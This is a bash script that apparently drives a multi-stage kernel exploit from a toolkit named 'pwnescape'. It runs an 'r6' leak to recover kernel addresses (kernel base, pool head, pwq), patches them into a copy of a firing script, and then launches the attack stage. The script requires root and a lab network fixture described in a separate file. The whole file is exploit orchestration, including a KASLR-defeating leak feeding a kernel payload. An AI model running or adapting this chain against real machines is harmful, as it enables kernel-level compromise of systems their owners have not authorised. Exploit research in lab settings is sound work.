#!/bin/bash
# run_r6.sh -- run the r6 leak, patch the payload constants, then dry/fire.
#
# Usage:
#   sudo bash scripts/r6/run_r6.sh [victims] [read_gw] [fire_gw]
# Defaults: 40 0x7c30 0x7e00
#
# The script assumes the host fixture in LAB-ENV.md is already up:
#   r6veth_up.sh, listen_on.py, mangle/INPUT CHECKSUM, fd00:1::1/64.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
T="${PWNESCAPE_TOOLS:-/opt/pwnescape/tools}"
N="${1:-40}"
GW_R="${2:-0x7c30}"
GW_F="${3:-0x7e00}"

if [ "$(id -u)" -ne 0 ]; then
  echo "run as root" >&2
  exit 1
fi

if [ ! -x "$T/r6obs" ]; then
  echo "missing $T/r6obs; run scripts/common/install.sh first" >&2
  exit 1
fi

echo "=== 1. leak (read-only) ==="
OUT="$(mktemp /tmp/r6read.XXXXXX.log)"
python3 "$T/r6read.py" "$N" "$GW_R" | tee "$OUT"

DERIVED="$(grep '^DERIVED ' "$OUT" | tail -1 || true)"
if [ -z "$DERIVED" ]; then
  echo "no DERIVED line; leak failed; aborting" >&2
  exit 2
fi

PWQ=$(echo "$DERIVED" | sed -n 's/.*pwq=\(0x[0-9a-fA-F]*\).*/\1/p')
PH=$(echo "$DERIVED" | sed -n 's/.*poolhead=\(0x[0-9a-fA-F]*\).*/\1/p')
KBASE=$(echo "$DERIVED" | sed -n 's/.*kbase=\(0x[0-9a-fA-F]*\).*/\1/p')
if [ -z "$PWQ" ] || [ -z "$PH" ] || [ -z "$KBASE" ]; then
  echo "failed to parse DERIVED: $DERIVED" >&2
  exit 3
fi
echo "derived: pwq=$PWQ poolhead=$PH kbase=$KBASE"

echo "=== 2. patch a run copy of r6fire.py ==="
RUN="/tmp/r6fire_run.py"
cp "$T/r6fire.py" "$RUN"
python3 - "$RUN" "$PWQ" "$PH" "$KBASE" <<'PY'
import re, sys
path, pwq, ph, kbase = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
s = open(path).read()
s = re.sub(r'(?m)^PWQ\s*=\s*.*$', 'PWQ   = ' + pwq, s, count=1)
s = re.sub(r'(?m)^PH\s*=\s*.*$', 'PH    = ' + ph, s, count=1)
s = re.sub(r'(?m)^KBASE\s*=\s*.*$', 'KBASE = ' + kbase, s, count=1)
open(path, 'w').write(s)
PY
chmod +x "$RUN"
grep -E '^(PWQ|PH|KBASE) ' "$RUN" | head -3

echo "=== 3. dry/fire ==="
python3 "$RUN" 60 "$GW_F"
